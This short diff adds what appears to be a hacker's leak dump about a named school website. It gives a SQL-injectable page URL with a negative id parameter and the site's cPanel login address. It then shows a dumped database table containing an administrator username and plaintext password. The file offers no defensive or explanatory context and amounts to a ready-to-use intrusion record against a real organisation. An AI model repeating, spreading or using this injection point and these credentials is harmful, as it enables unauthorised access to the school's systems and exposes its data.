@@ -1,0 +1,10 @@
+Wb-site: https://www.pazhassirajaschool.com
+vulnerability: https://www.pazhassirajaschool.com/news-more.php?id=-23
+panel: https://www.pazhassirajaschool.com/cpanel
+
+Dumped: 
++----+--------------+--------------------+
+| id | user_paz_unm | pwd_adm_pazssi     |
++----+--------------+--------------------+
+| 1  | adminpazusr  | 123pazsecadmin7895 |
++----+--------------+--------------------+
